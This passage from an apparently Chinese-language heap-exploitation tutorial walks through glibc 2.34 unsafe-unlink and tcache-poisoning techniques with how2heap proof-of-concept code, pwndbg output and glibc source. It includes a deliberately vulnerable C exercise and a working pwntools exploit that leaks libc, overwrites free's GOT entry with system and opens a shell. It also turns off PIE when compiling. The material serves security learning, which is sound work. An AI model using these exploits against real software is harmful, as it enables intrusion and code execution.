<p>发现FD-&gt;bk和BK-&gt;fd都已经指向了0x00005555557572a0，即fake_chunk_ptr。<br>fake_chunk在栈上的地址为0x7fffffffdae0，所以我们只需要构造“fakeFD”，使fakeFD-&gt;bk的地址是0x7fffffffdae0即可，因为这个地址存放的内容是0x00005555557572a0，即fake_chunk_ptr。所以fakeFD_ptr的地址就是bk的地址+<code>3*sizeof(size_t)</code>。“fakeBK”同理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd = &amp;pre-3*sizeof(size_t) = FD_ptr</span><br><span class="line">FD-&gt;bk = FD_ptr+3*sizeof(size_t) = &amp;pre = fake_chunk_ptr</span><br><span class="line"></span><br><span class="line">bk = &amp;pre-2*sizeof(size_t) = BK_ptr</span><br><span class="line">BK-&gt;fd = BK_ptr+2*sizeof(size_t) = &amp;pre = fake_chunk_ptr</span><br></pre></td></tr></table></figure></p>
<p>这样就完成了<code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code>的检查。</p>
<p>然后是prev_size的检查和prev_inuse的修改。<br>又申请了一块大的内存，大于tcache的最大大小，这样free的时候就不会放入tcache bin。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *head = a - <span class="number">2</span>;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p a</span><br><span class="line">$3 = (size_t *) 0x5555557572e0</span><br><span class="line">pwndbg&gt; p head</span><br><span class="line">$4 = (size_t *) 0x5555557572d0</span><br></pre></td></tr></table></figure>
<p>复习一下指针加减法：指针的加减是砍掉一个星之后的数据宽度，<code>size_t*</code>砍一个星剩下<code>size_t</code>，<code>sizeof(size_t)=8</code>。a的地址是不包含头部数据的0x10的，所以head[0]就是存放prev_size的地方，head[1]就是存放chunk_size和AMP的地方。<br>运行的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x5555557572d0</span><br><span class="line">0x5555557572d0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555557572e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">pwndbg&gt; x/8gx 0x5555557572d0</span><br><span class="line">0x5555557572d0: 0x0000000000000030      0x0000000000000420</span><br><span class="line">0x5555557572e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757300: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>prev_size修改成了0x30，prev_inuse修改成了0。<br>然后free掉a，就会触发free中unlink。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_consolidate.png" alt><br>进入了合并。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_consolidate2.png" alt><br>chunk_ptr指向了前面0x30的地方</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x p</span><br><span class="line">$5 = 0x5555557572a0</span><br></pre></td></tr></table></figure>
<p>unlink函数的实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  if (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span><br><span class="line">    malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);</span><br><span class="line"></span><br><span class="line">      if (fd-&gt;fd_nextsize == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">	  if (p-&gt;fd_nextsize == p)</span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  else</span><br><span class="line">	    &#123;</span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      else</span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简单来说就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd</span><br><span class="line">BK = P-&gt;bk</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure></p>
<p>如果用到了nextsize也一起改了。<br>再看一下计算公式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd = &amp;pre-3*sizeof(size_t) = FD_ptr</span><br><span class="line">FD-&gt;bk = FD_ptr+3*sizeof(size_t) = &amp;pre = fake_chunk_ptr</span><br><span class="line"></span><br><span class="line">bk = &amp;pre-2*sizeof(size_t) = BK_ptr</span><br><span class="line">BK-&gt;fd = BK_ptr+2*sizeof(size_t) = &amp;pre = fake_chunk_ptr</span><br></pre></td></tr></table></figure></p>
<p>这样之后，BK-&gt;fd就会指向FD_ptr，即<code>&amp;pre-3*sizeof(size_t)=&amp;pre-0x18</code>。</p>
<h3 id="一个小例题"><a href="#一个小例题" class="headerlink" title="一个小例题"></a>一个小例题</h3><p>简单的小例题，可以不看 exp 检测一下学习效果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">char</span>* p[<span class="number">6</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>,p);</span><br><span class="line">	<span class="keyword">char</span>* c = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="keyword">char</span>* cc = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">	<span class="keyword">char</span>* ccc = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	<span class="keyword">char</span>* b = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">	p[<span class="number">3</span>] = b;</span><br><span class="line">	p[<span class="number">4</span>] = cc;</span><br><span class="line">	p[<span class="number">5</span>] = ccc;</span><br><span class="line">	<span class="built_in">free</span>(cc);</span><br><span class="line">	b = p[<span class="number">3</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,b);</span><br><span class="line">	b = p[<span class="number">3</span>];</span><br><span class="line">	cc = p[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,b);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,cc);</span><br><span class="line">	ccc = p[<span class="number">5</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,ccc);</span><br><span class="line">	<span class="built_in">free</span>(ccc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译一下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/PycharmProjectspy2/pwn# echo 2 &gt;/proc/sys/kernel/randomize_va_space</span><br><span class="line">pukrquq@ubuntu:/home/PycharmProjectspy2/pwn$ gcc -no-pie -o 2221 ./2.c</span><br><span class="line">pukrquq@ubuntu:/home/PycharmProjectspy2/pwn$ patchelf --set-interpreter /home/pukrquq/Downloads/glibc-2.34/64/lib/ld-linux-x86-64.so.2 ./2221</span><br></pre></td></tr></table></figure></p>
<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./2221"</span>)</span><br><span class="line"><span class="keyword">print</span> pidof(p)</span><br><span class="line">e = ELF(<span class="string">"./2221"</span>)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">libc = ELF(<span class="string">"/home/pukrquq/Downloads/glibc-2.34/64/lib/libc.so.6"</span>)</span><br><span class="line">p_addr = p.recvline()</span><br><span class="line">p_addr = int(p_addr, <span class="number">16</span>)</span><br><span class="line"><span class="comment">#触发unlink</span></span><br><span class="line">payload1 = pwn.p64(<span class="number">0</span>)+pwn.p64(<span class="number">0x30</span>)+pwn.p64(p_addr)+pwn.p64(p_addr+<span class="number">0x8</span>)+<span class="string">'a'</span>*<span class="number">0x10</span>+pwn.p64(<span class="number">0x30</span>)+pwn.p64(<span class="number">0x430</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">free_got = e.got[<span class="string">'free'</span>]</span><br><span class="line">free_libc = libc.symbols[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x18</span>+pwn.p64(free_got)+pwn.p64(free_got)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">real_addr = p.recvline(keepends=<span class="literal">False</span>)[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> real_addr</span><br><span class="line"><span class="comment">#real_addr = int(real_addr, 16)</span></span><br><span class="line">real_addr = binascii.b2a_hex(real_addr)</span><br><span class="line">real_addr = int(real_addr, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(real_addr)</span><br><span class="line">libc_base = real_addr-free_libc</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="comment">#binsh = libc_base+libc.search("/bin/sh").next()</span></span><br><span class="line">binsh = next(libc.search(<span class="string">"/bin/sh"</span>.encode())) + libc_base</span><br><span class="line">payload3 = pwn.p64(system_addr)</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">payload4 = <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="comment">#print hex(binsh)</span></span><br><span class="line">p.sendline(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="tcache-poisoning-glibc2-34"><a href="#tcache-poisoning-glibc2-34" class="headerlink" title="tcache_poisoning_glibc2.34"></a>tcache_poisoning_glibc2.34</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>修改tcache bin 中chunk的next指针，使其被覆盖为任意地址。注意glibc2.34版本有地址保护。<br>不过要注意地址对齐。</p>
<h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"</span></span><br><span class="line">		   <span class="string">"returning a pointer to an arbitrary location (in this case, the stack).\n"</span></span><br><span class="line">		   <span class="string">"The attack is very similar to fastbin corruption attack.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"</span></span><br><span class="line">		   <span class="string">"We have to create and free one more chunk for padding before fd pointer hijacking.\n\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n"</span></span><br><span class="line">		   <span class="string">"An heap address leak is needed to perform tcache poisoning.\n"</span></span><br><span class="line">		   <span class="string">"The same patch also ensures the chunk returned by tcache is properly aligned.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> stack_var[<span class="number">0x10</span>];</span><br><span class="line">	<span class="keyword">size_t</span> *target = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// choose a properly aligned target address</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span>(((<span class="keyword">long</span>)&amp;stack_var[i] &amp; <span class="number">0xf</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			target = &amp;stack_var[i];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	assert(target != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, target);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 2 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line">	<span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the buffers...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"</span></span><br><span class="line">		   <span class="string">"to point to the location to control (%p).\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, target);</span><br><span class="line">	<span class="comment">// VULNERABILITY</span></span><br><span class="line">	<span class="comment">// the following operation assumes the address of b is known, which requires a heap leak</span></span><br><span class="line">	b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)((<span class="keyword">long</span>)target ^ (<span class="keyword">long</span>)b &gt;&gt; <span class="number">12</span>);</span><br><span class="line">	<span class="comment">// VULNERABILITY</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, target);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p ].\n"</span>, target);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(128): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="keyword">long</span>)target == (<span class="keyword">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> <span class="built_in">stack</span>[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> ((<span class="keyword">long</span>)&amp;<span class="built_in">stack</span>[i]&amp;<span class="number">0xf</span>) i++;</span><br><span class="line">	<span class="keyword">size_t</span> *target = &amp;<span class="built_in">stack</span>[i];</span><br><span class="line">	<span class="keyword">size_t</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">size_t</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="keyword">size_t</span>)((<span class="keyword">long</span>)target ^ ((<span class="keyword">long</span>)b &gt;&gt; <span class="number">12</span>));</span><br><span class="line">	<span class="keyword">size_t</span> * xx = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">size_t</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	assert( c == target);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-3"><a href="#pwndbg调试-3" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>先申请了一个数组，并检查地址是否0x10字节对齐。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="comment">/* MALLOC_ALIGNMENT is the minimum alignment for malloc'ed chunks.  It</span></span><br><span class="line"><span class="comment">   must be a power of two at least 2 * SIZE_SZ, even on machines for</span></span><br><span class="line"><span class="comment">   which smaller alignments would suffice. It may be defined as larger</span></span><br><span class="line"><span class="comment">   than this though. Note however that code and data structures are</span></span><br><span class="line"><span class="comment">   optimized for the case of 8-byte alignment.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line">			  ? __alignof__ (<span class="keyword">long</span> <span class="keyword">double</span>) : <span class="number">2</span> * SIZE_SZ)</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为申请和释放的地址必须是0x10字节对齐的，如果要覆盖为我们任意的地址，那么这个任意地址也应该要对齐。检查到一个对齐的就可以break了。<br>0xf的二进制为1111，如果地址是0x10对齐，那么最后4位二进制位应该是0000。所以<code>&amp;0xf</code>就是取最后四位二进制位进行与运算，如果运算结果是0那么证明检测地址的最后4位二进制位应该是0000，即0x10对齐。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x &amp;stack</span><br><span class="line">$1 = 0x7fffffffda70</span><br></pre></td></tr></table></figure></p>
<p>第一个就可以作为target_addr。<br>申请两个chunk，再free掉。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/poison_bin.png" alt><br>tcache bin是先进后出原则。并且，在glibc2.32之后引入了PROTECT_PTR地址保护，应用在tcache bin和fast bin中。看看它是怎么保护的：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the "next" pointers of the</span></span><br><span class="line"><span class="comment">   lists' chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked 